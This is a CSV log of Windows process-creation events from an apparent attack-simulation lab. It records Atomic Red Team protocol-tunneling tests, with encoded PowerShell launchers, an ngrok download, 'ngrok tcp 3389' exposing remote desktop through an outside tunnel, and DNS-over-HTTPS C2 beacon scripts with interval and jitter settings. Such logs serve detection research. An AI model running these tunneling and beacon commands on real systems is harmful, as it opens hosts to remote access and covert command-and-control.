dest,user,"parent_process","parent_process_name","process_name","original_file_name",process,"process_id","parent_process_id",count,firstTime,lastTime
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","powershell.exe","powershell.exe","PowerShell.EXE","""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADcAMgAiACAALQBDAG8AbgBmAGkAcgBtADoAJABmAGEAbABzAGUAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgADMAMAAwACAALQBFAHgAZQBjAHUAdABpAG8AbgBMAG8AZwBQAGEAdABoACAAQwA6AFwAQQB0AG8AbQBpAGMAUgBlAGQAVABlAGEAbQBcAGEAdABjAF8AZQB4AGUAYwB1AHQAaQBvAG4ALgBjAHMAdgA=",4688,3712,1,"2023-09-30T10:50:09","2023-09-30T10:50:09"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","powershell.exe","powershell.exe","PowerShell.EXE","""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADcAMgAiACAALQBDAGwAZQBhAG4AdQBwAA==",5668,4744,1,"2023-09-30T10:56:47","2023-09-30T10:56:47"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==","powershell.exe","powershell.exe","PowerShell.EXE","""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADcAMgAiACAALQBHAGUAdABQAHIAZQByAGUAcQBzAA==",2040,4952,1,"2023-09-30T10:49:32","2023-09-30T10:49:32"
"ar-win-dc.attackrange.local",Administrator,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","powershell.exe","ngrok.exe","-","""C:\Users\Public\ngrok\ngrok.exe"" tcp 3389",5376,5808,1,"2023-09-30T10:56:38","2023-09-30T10:56:38"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",1080,5892,1,"2023-09-30T10:56:34","2023-09-30T10:56:34"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",3252,5892,1,"2023-09-30T10:56:34","2023-09-30T10:56:34"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\mg4actqq\mg4actqq.cmdline""",4892,5892,1,"2023-09-30T10:56:34","2023-09-30T10:56:34"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null}","powershell.exe","ngrok.exe","-","""C:\Users\Public\ngrok\ngrok.exe"" config add-authtoken N/A",4708,5892,1,"2023-09-30T10:56:34","2023-09-30T10:56:34"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null}","powershell.exe","powershell.exe","PowerShell.EXE","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile",5808,5892,1,"2023-09-30T10:56:38","2023-09-30T10:56:38"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5244,1880,1,"2023-09-30T10:49:37","2023-09-30T10:49:37"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",6072,1880,1,"2023-09-30T10:49:37","2023-09-30T10:49:37"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\1e430ugj\1e430ugj.cmdline""",2052,1880,1,"2023-09-30T10:49:37","2023-09-30T10:49:37"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5072,6004,1,"2023-09-30T10:56:53","2023-09-30T10:56:53"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5612,6004,1,"2023-09-30T10:56:53","2023-09-30T10:56:53"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\fqcxxlm1\fqcxxlm1.cmdline""",2328,6004,1,"2023-09-30T10:56:53","2023-09-30T10:56:53"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Set-Location C:\AtomicRedTeam\atomics
.\T1572\src\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",2228,5628,1,"2023-09-30T10:51:19","2023-09-30T10:51:19"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Set-Location C:\AtomicRedTeam\atomics
.\T1572\src\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",4136,5628,1,"2023-09-30T10:51:18","2023-09-30T10:51:18"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Set-Location C:\AtomicRedTeam\atomics
.\T1572\src\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\xf3iqel0\xf3iqel0.cmdline""",1936,5628,1,"2023-09-30T10:51:18","2023-09-30T10:51:18"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Set-Location C:\AtomicRedTeam\atomics
.\T1572\src\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",4900,1824,1,"2023-09-30T10:56:19","2023-09-30T10:56:19"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Set-Location C:\AtomicRedTeam\atomics
.\T1572\src\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5544,1824,1,"2023-09-30T10:56:19","2023-09-30T10:56:19"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {Set-Location C:\AtomicRedTeam\atomics
.\T1572\src\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\34ocw3hq\34ocw3hq.cmdline""",1016,1824,1,"2023-09-30T10:56:19","2023-09-30T10:56:19"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\"""" -UseBasicParsing).Content }}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",3460,5728,1,"2023-09-30T10:50:12","2023-09-30T10:50:12"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\"""" -UseBasicParsing).Content }}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",4592,5728,1,"2023-09-30T10:50:12","2023-09-30T10:50:12"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\"""" -UseBasicParsing).Content }}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\bytldcku\bytldcku.cmdline""",5508,5728,1,"2023-09-30T10:50:12","2023-09-30T10:50:12"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",2756,4788,1,"2023-09-30T10:56:51","2023-09-30T10:56:51"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",3040,4788,1,"2023-09-30T10:56:51","2023-09-30T10:56:51"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5024,5664,1,"2023-09-30T10:56:50","2023-09-30T10:56:50"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5392,5848,1,"2023-09-30T10:56:52","2023-09-30T10:56:52"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5840,5664,1,"2023-09-30T10:56:50","2023-09-30T10:56:50"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",5992,5848,1,"2023-09-30T10:56:52","2023-09-30T10:56:52"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\n3jgbqjo\n3jgbqjo.cmdline""",4684,5848,1,"2023-09-30T10:56:52","2023-09-30T10:56:52"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\qahiz0en\qahiz0en.cmdline""",4640,5664,1,"2023-09-30T10:56:50","2023-09-30T10:56:50"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" &amp; {}","powershell.exe","csc.exe","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\vku0i4mm\vku0i4mm.cmdline""",2016,4788,1,"2023-09-30T10:56:51","2023-09-30T10:56:51"
"ar-win-dc.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADcAMgAiACAALQBDAG8AbgBmAGkAcgBtADoAJABmAGEAbABzAGUAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgADMAMAAwACAALQBFAHgAZQBjAHUAdABpAG8AbgBMAG8AZwBQAGEAdABoACAAQwA6AFwAQQB0AG8AbQBpAGMAUgBlAGQAVABlAGEAbQBcAGEAdABjAF8AZQB4AGUAYwB1AHQAaQBvAG4ALgBjAHMAdgA=","powershell.exe","HOSTNAME.EXE","hostname.exe","""C:\Windows\system32\HOSTNAME.EXE""",1464,4688,1,"2023-09-30T10:50:10","2023-09-30T10:50:10"
